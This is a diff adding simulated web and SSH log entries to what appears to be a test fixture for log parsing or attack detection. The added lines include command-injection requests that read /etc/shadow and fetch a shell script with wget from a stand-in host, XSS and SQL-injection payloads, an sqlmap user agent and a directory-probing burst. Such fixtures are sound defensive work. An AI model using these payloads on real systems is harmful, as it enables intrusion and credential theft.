@@ -13,3 +13,20 @@
 2026-11-02T09:17:30Z 192.0.2.10 web GET /items?id=5%20or%201=1 200
 2026-11-02T09:18:00Z not-an-address web GET / 200
 this line is not a log entry
+2026-11-02T09:20:01Z 203.0.113.9 sshd login accepted user=root
+2026-11-02T09:21:10Z 198.51.100.140 web GET /ping?host=8.8.8.8;cat+/etc/shadow 200
+2026-11-02T09:21:12Z 198.51.100.140 web GET /ping?host=x%7Cwget%20http://203.0.113.200/a.sh 200
+2026-11-02T09:22:30Z 198.51.100.150 web GET /comment?text=%3Cscript%3Ealert(1)%3C/script%3E 200
+2026-11-02T09:22:31Z 198.51.100.150 web GET /profile?name=<img+src=x+onerror=alert(1)> 200
+2026-11-02T09:23:00Z 198.51.100.160 web GET / 200 "sqlmap/1.8.4#stable"
+2026-11-02T09:24:00Z 198.51.100.170 web GET /admin 404
+2026-11-02T09:24:01Z 198.51.100.170 web GET /backup 404
+2026-11-02T09:24:02Z 198.51.100.170 web GET /old 404
+2026-11-02T09:24:03Z 198.51.100.170 web GET /test 404
+2026-11-02T09:24:04Z 198.51.100.170 web GET /phpmyadmin 404
+2026-11-02T09:24:05Z 198.51.100.170 web GET /console 404
+2026-11-02T09:24:06Z 198.51.100.170 web GET /api/v1 404
+2026-11-02T09:24:07Z 198.51.100.170 web GET /config 404
+2026-11-02T09:24:08Z 198.51.100.170 web GET /db 404
+2026-11-02T09:24:09Z 198.51.100.170 web GET /login.bak 404
+2026-11-02T09:24:10Z 198.51.100.170 web GET /staging 404
